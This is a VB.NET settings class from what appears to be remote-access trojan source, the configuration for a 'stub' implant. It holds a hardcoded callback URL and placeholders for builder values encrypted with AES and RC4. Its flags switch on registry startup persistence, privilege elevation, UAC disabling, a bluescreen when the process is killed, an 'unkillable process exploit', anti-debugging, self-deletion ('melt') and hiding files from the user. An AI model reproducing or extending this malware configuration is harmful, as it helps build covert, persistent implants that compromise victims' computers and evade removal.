Imports System.Reflection

<ObfuscationAttribute(Exclude:=False, ApplyToMembers:=True)> _
Public Class Settings

    ' here are the settings.
    ' For debugging testing they are directly assigned.
    ' When later used in the client, you need to comment them out and use the AES-Encrypted settings, so the
    ' decryption will work.

    Public Shared ServerVersion As String = "1.1.0.0 - Beta"

    Public Shared StubUrl As String = "http://lazy-has-a-small-penis.com/Zero" ' ^_^AESDecrypt("###HOST###", "zremote")
    Public Shared StubMutex As String = "datmutex" 'SecureStrings.Rc4("###Mutex###")

    Public Shared StubInstall As Boolean = False 'CBool(SecureStrings.Rc4("###StubInstall###"))
    Public Shared StubAppData As Boolean = False 'CBool(SecureStrings.Rc4("###StubAppData###"))
    Public Shared StubTemp As Boolean = False 'CBool(SecureStrings.Rc4("###StubTemp###"))
    Public Shared StubWinDir As Boolean = False 'CBool(SecureStrings.Rc4("###StubWinDir###"))
    Public Shared StubFileName As String = False 'SecureStrings.Rc4("###Filename###")
    Public Shared StubFolderName As String = False 'SecureStrings.Rc4("###Foldername###")

    Public Shared StubHKCUStartup As Boolean = False 'CBool(SecureStrings.Rc4("###StartupHKCU###"))
    Public Shared StubHKLMStartup As Boolean = False 'CBool(SecureStrings.Rc4("###StartupHKLM###"))
    Public Shared StubHKCUStartupKey As String = False 'SecureStrings.Rc4("###HKCUKeyName###")
    Public Shared StubHKLMStartupKey As String = False 'SecureStrings.Rc4("###HKLMKeyName###")
    Public Shared StubRunOnce As Boolean = False 'CBool(SecureStrings.Rc4("###RunOnce###"))

    Public Shared StubElevate As Boolean = False 'CBool(SecureStrings.Rc4("###Elevate###"))
    Public Shared StubProcessSecurity As Boolean = False 'CBool(SecureStrings.Rc4("###ProcessSecurity###"))
    Public Shared StubBlueScreenOnKill As Boolean = False 'CBool(SecureStrings.Rc4("###BreakOnTermination###"))
    Public Shared StubDisableZonechecks As Boolean = False 'CBool(SecureStrings.Rc4("###DisableZonecheck###"))
    Public Shared StubProcessPersistance As Boolean = False 'CBool(SecureStrings.Rc4("###TwinProcess###"))
    Public Shared StubDisableUAC As Boolean = False 'CBool(SecureStrings.Rc4("###DisableUAC###"))

    Public Shared StubHiddenAttrib As Boolean = False 'CBool(SecureStrings.Rc4("###HiddenAttrib###"))
    Public Shared StubMelt As Boolean = False 'CBool(SecureStrings.Rc4("###Melt###"))
    Public Shared StubVisibleMode As Boolean = True 'CBool(SecureStrings.Rc4("###VisibleMode###"))
    Public Shared StubDisableShowHiddenFiles As Boolean = False 'CBool(SecureStrings.Rc4("###DisableshowHiddenFiles###"))

    Public Shared StubUnkillableProcessExploit As Boolean = False 'CBool(SecureStrings.Rc4("###UnkillableProcessExploit###"))
    Public Shared StubAntiDllInject As Boolean = False 'CBool(SecureStrings.Rc4("###AntiDllInject###"))
    Public Shared StubAntiDebug As Boolean = False 'CBool(SecureStrings.Rc4("###AntiDebug###"))

    Public Shared StubQuerySpeed As Integer = 2000 ' CInt(SecureStrings.Rc4("###QuerySpeed###"))


    'Public Shared ServerVersion As String = "1.0.0.0"

    'Public Shared StubUrl As String = AESDecrypt("###HOST###", "zremote")
    'Public Shared StubMutex As String = SecureStrings.Rc4("###Mutex###")

    'Public Shared StubInstall As Boolean = CBool(SecureStrings.Rc4("###StubInstall###"))
    'Public Shared StubAppData As Boolean = CBool(SecureStrings.Rc4("###StubAppData###"))
    'Public Shared StubTemp As Boolean = CBool(SecureStrings.Rc4("###StubTemp###"))
    'Public Shared StubWinDir As Boolean = CBool(SecureStrings.Rc4("###StubWinDir###"))
    'Public Shared StubFileName As String = SecureStrings.Rc4("###Filename###")
    'Public Shared StubFolderName As String = SecureStrings.Rc4("###Foldername###")

    'Public Shared StubHKCUStartup As Boolean = CBool(SecureStrings.Rc4("###StartupHKCU###"))
    'Public Shared StubHKLMStartup As Boolean = CBool(SecureStrings.Rc4("###StartupHKLM###"))
    'Public Shared StubHKCUStartupKey As String = SecureStrings.Rc4("###HKCUKeyName###")
    'Public Shared StubHKLMStartupKey As String = SecureStrings.Rc4("###HKLMKeyName###")
    'Public Shared StubRunOnce As Boolean = CBool(SecureStrings.Rc4("###RunOnce###"))

    'Public Shared StubElevate As Boolean = CBool(SecureStrings.Rc4("###Elevate###"))
    'Public Shared StubProcessSecurity As Boolean = CBool(SecureStrings.Rc4("###ProcessSecurity###"))
    'Public Shared StubBlueScreenOnKill As Boolean = CBool(SecureStrings.Rc4("###BreakOnTermination###"))
    'Public Shared StubDisableZonechecks As Boolean = CBool(SecureStrings.Rc4("###DisableZonecheck###"))
    'Public Shared StubProcessPersistance As Boolean = CBool(SecureStrings.Rc4("###TwinProcess###"))
    'Public Shared StubDisableUAC As Boolean = CBool(SecureStrings.Rc4("###DisableUAC###"))

    'Public Shared StubHiddenAttrib As Boolean = CBool(SecureStrings.Rc4("###HiddenAttrib###"))
    'Public Shared StubMelt As Boolean = CBool(SecureStrings.Rc4("###Melt###"))
    'Public Shared StubVisibleMode As Boolean = CBool(SecureStrings.Rc4("###VisibleMode###"))
    'Public Shared StubDisableShowHiddenFiles As Boolean = CBool(SecureStrings.Rc4("###DisableshowHiddenFiles###"))

    'Public Shared StubUnkillableProcessExploit As Boolean = CBool(SecureStrings.Rc4("###UnkillableProcessExploit###"))
    'Public Shared StubAntiDllInject As Boolean = CBool(SecureStrings.Rc4("###AntiDllInject###"))
    'Public Shared StubAntiDebug As Boolean = CBool(SecureStrings.Rc4("###AntiDebug###"))

    'Public Shared StubQuerySpeed As Integer = CInt(SecureStrings.Rc4("###QuerySpeed###"))


End Class
